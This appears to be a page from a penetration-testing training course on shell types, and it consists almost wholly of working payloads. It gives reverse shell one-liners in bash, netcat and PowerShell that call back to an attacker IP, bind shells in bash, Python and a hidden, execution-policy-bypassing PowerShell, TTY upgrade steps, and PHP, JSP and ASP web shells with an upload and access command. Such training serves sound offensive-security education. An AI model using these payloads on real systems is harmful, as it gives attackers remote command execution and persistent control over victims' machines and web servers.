<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/77/section/725
// Platform Version: V1
// Module ID: 77
// Module Name: Getting Started
// Module Difficulty: Fundamental
// Section ID: 725
// Section Title: Types of Shells
// Page Title: Getting Started
// Page Number: 10
-->

# Types of Shells

**Module Name:** Getting Started **Page Number:** 10

#### GETTING STARTED

# Types of Shells

## Reverse Shell

#### Netcat Listener

``` shell-session
ndefstathiou@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

#### Connect Back IP

``` shell-session
ndefstathiou@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

#### Reverse Shell Command

``` bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

``` powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

``` shell-session
ndefstathiou@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Bind Shell

#### Bind Shell Command

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

``` python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

``` powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Netcat Connection

``` shell-session
ndefstathiou@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Upgrading TTY

``` shell-session
ndefstathiou@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

``` shell-session
www-data@remotehost$ ^Z

ndefstathiou@htb[/htb]$ stty raw -echo
ndefstathiou@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

``` shell-session
ndefstathiou@htb[/htb]$ echo $TERM

xterm-256color
```

``` shell-session
ndefstathiou@htb[/htb]$ stty size

67 318
```

``` shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

## Web Shell

#### Writing a Web Shell

``` php
<?php system($_REQUEST["cmd"]); ?>
```

``` jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

``` asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell

``` bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Accessing Web Shell

![https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

``` shell-session
ndefstathiou@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

####